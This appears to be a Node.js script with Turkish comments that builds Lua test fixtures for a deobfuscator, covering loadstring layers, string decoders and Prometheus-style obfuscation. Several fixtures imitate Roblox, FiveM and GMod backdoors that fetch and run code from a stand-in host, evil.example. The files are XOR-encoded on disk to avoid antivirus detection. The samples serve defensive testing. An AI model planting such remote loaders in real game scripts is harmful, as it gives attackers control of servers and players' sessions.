// Temel teknik fixture'larını üretir: node scripts/make-fixtures.js
// Fixture'lar diske XOR + base64 (.lua.x) olarak yazılır ve yalnızca bellekte çözülür (test/fixture-codec.js): zararlı
// koda benzeyen test örnekleri (arka kapı, uzaktan yükleme) antivirüsü tetiklemesin. Şüpheli dizgeler betikte parçalı yazılır.
import { writeFileSync, mkdirSync, readdirSync, rmSync } from 'node:fs';
import { encodeFixture } from '../test/fixture-codec.js';

const dir = new URL('../test/fixtures/', import.meta.url);
mkdirSync(dir, { recursive: true });
for (const f of readdirSync(dir)) if (f.endsWith('.x')) rmSync(new URL(f, dir));

const URL_ = ['https://evil.', 'example/', 'payload'].join('');
const bytes = (s) => [...Buffer.from(s)].join(', ');
const dec = (s) => [...Buffer.from(s)].map((x) => `\\${x}`).join('');
const fx = {};

fx['loadstring-plain'] = `-- EXPECT: print("hi")
-- GONE: loadstring
loadstring("print('hi')")()
`;

fx['decimal-escapes'] = `-- EXPECT: print("kacis")
-- GONE: loadstring
loadstring("${dec("print('kacis')")}")()
`;

fx['char-decoder'] = `-- EXPECT: print("char")
-- GONE: string.char
-- GONE: loadstring
local k = { ${bytes("print('char')")} }
local s = ''
for i = 1, #k do
  s = s .. string.char(k[i])
end
loadstring(s)()
`;

fx['alias'] = `-- EXPECT: print("alias")
-- GONE: loadstring
local L = loadstring
local C = string.char
L(C(${bytes("print('alias')")}))()
`;

fx['nested-layers'] = `-- EXPECT: print("derin")
-- GONE: loadstring
loadstring("loadstring(\\"${dec("print('derin')")}\\")()")()
`;

fx['fold-char'] = `-- EXPECT: print("Hi")
-- GONE: string.char
print(string.char(72, 105))
`;

fx['dead-branch'] = `-- EXPECT: print("canli")
-- GONE: olu
if false then
  print('olu')
end
while nil do
  print('olu')
end
print('canli')
`;

fx['iife'] = `-- EXPECT: print("ic")
-- GONE: function
(function()
  print('ic')
end)()
`;

fx['load-54'] = `-- EXPECT: print(
-- GONE: load(
local x = load("return 7 // 2")()
print(x)
`;

// ---- güvenlik: dış girdiye bağlı kod silinmemeli
fx['input-keep'] = `-- KEEP: os.getenv
-- KEEP: loadstring
local c = os.getenv('PEEL_CMD') or 'y = 2'
loadstring(c)()
print('bitti')
`;

fx['roblox-remote-keep'] = `-- KEEP: HttpGet
-- KEEP: loadstring
loadstring(game:HttpGet('${URL_}'))()
print('yuklendi')
`;

fx['fivem-backdoor-keep'] = `-- KEEP: PerformHttpRequest
-- KEEP: load(
-- EXPECT: print("fivem")
local function run(e, d)
  if d then load(d)() end
end
PerformHttpRequest('${URL_}', run, 'GET')
loadstring("${dec("print('fivem')")}")()
`;

fx['fivem-layered'] = `-- KEEP: PerformHttpRequest
-- GONE: string.char
local s = ''
for _, b in ipairs({ ${bytes(`PerformHttpRequest('${URL_}', function(e, d) end, 'POST', 'x')`)} }) do
  s = s .. string.char(b)
end
loadstring(s)()
`;

fx['gmod-keep'] = `-- KEEP: http.Fetch
-- KEEP: RunString
http.Fetch('${URL_}', function(body) RunString(body) end)
hook.Add('Think', 'x', function() end)
`;

fx['side-effects-keep'] = `-- KEEP: os.execute
-- KEEP: io.open
-- EXPECT: print("yan")
local f = io.open('out.txt', 'w')
if f then f:write('x') f:close() end
os.execute('echo x')
loadstring("print('yan')")()
`;

fx['shebang'] = `#!/usr/bin/env lua
-- EXPECT: print("sb")
-- GONE: loadstring
loadstring("print('sb')")()
`;

// özel durumlu dizge çözücü (Prometheus EncryptStrings biçimi): önbellek tablosu + anahtarlı XOR
const xorEnc = (s, k) => [...Buffer.from(s)].map((c, i) => `\\${(c ^ ((k + i * 7) % 256)) & 255}`).join('');
fx['string-decoder'] = `-- EXPECT: print("Hello, decoder")
-- EXPECT: print("peel")
-- GONE: decode(
local decode, cache
do
  local byte, char, concat = string.byte, string.char, table.concat
  local store = {}
  cache = setmetatable({}, { __index = store })
  function decode(s, key)
    if store[key] then return key end
    local out = {}
    for i = 1, #s do
      local b = byte(s, i)
      local m = (key + (i - 1) * 7) % 256
      local r = 0
      for bit = 0, 7 do
        local p = 2 ^ bit
        if (b % (p * 2) >= p) ~= (m % (p * 2) >= p) then r = r + p end
      end
      out[i] = char(r)
    end
    store[key] = concat(out)
    return key
  end
end
local greeting = cache[decode("${xorEnc('peel', 41)}", 41)]
print(cache[decode("${xorEnc('Hello, decoder', 99)}", 99)])
print(greeting)
`;

// sabit dizisi + döndürme + indeks sarmalayıcısı (Prometheus ConstantArray biçimi)
const arr = ['alpha', 'beta', 'gamma', 'delta'];
const rot = [...arr.slice(1), arr[0]];
fx['const-array'] = `-- EXPECT: print("alpha", "delta")
-- EXPECT: print("gammabeta")
-- GONE: 7000
local K = { ${rot.map((s) => JSON.stringify(s)).join(', ')} }
for _, r in ipairs({ { 1, 4 }, { 1, 3 } }) do
  while r[1] < r[2] do
    K[r[1]], K[r[2]], r[1], r[2] = K[r[2]], K[r[1]], r[1] + 1, r[2] - 1
  end
end
local function at(i) return K[i + 7000] end
print(at(-6997), at(-6998))
print(at(-6999) .. at(-6996))
`;

// çözücü anahtarı dış girdiden: çağrılar açılmamalı, ortam okuması kalmalı
fx['string-decoder-keep'] = `-- KEEP: os.getenv
-- KEEP: dec(
local key = tonumber(os.getenv('PEEL_KEY') or '3') or 3
local function dec(s)
  return (s:gsub('.', function(c) return string.char((c:byte() - key) % 256) end))
end
print(dec("${[...'secret'].map((c) => String.fromCharCode(c.charCodeAt(0) + 3)).join('')}"))
`;

// metatable vekilli local'ler (Prometheus ProxifyLocals biçimi) ve dosya sarmalayıcısı (WrapInFunction)
fx['proxify-locals'] = `-- EXPECT: x = x + i
-- EXPECT: print("total", x)
-- GONE: setmetatable
local E = function() end
local x = setmetatable({ v = 1 }, { __mul = function(t, v) t.v = v end, __sub = function(t, k) return t.v end })
local name = setmetatable({ w = "proxy" }, { __concat = function(t, k) return rawget(t, "w") end, __index = function(t, v) t.w = v end })
for i = 1, 3 do
  E(x * ((x - "a") + i))
end
print("total", x - "b")
print(name .. "q")
`;

fx['wrap-function'] = `-- EXPECT: print("wrapped", select("#", ...))
-- GONE: function(...)
return (function(...)
  local a = "wrapped"
  print(a, select("#", ...))
end)(...)
`;

// anlamsız local adları türetilen adlarla değişir; küresel ad olduğu gibi kalır
fx['rename'] = `-- EXPECT: for i = 1, 2 do
-- EXPECT: local function fn(param)
-- GONE: IlIlIlIl
-- GONE: l_0_
-- KEEP: lIlIlI = true
lIlIlI = true
local l_0_ = { "renamed" }
local function IlIlIlIl(IIlIlI) return IIlIlI .. "!" end
for _0x1a = 1, 2 do
  print(IlIlIlIl(l_0_[_0x1a] or "x"), _0x1a, lIlIlI)
end
`;

for (const [name, src] of Object.entries(fx)) writeFileSync(new URL(`${name}.lua.x`, dir), encodeFixture(Buffer.from(src)));
console.log(`${Object.keys(fx).length} fixture yazıldı`);
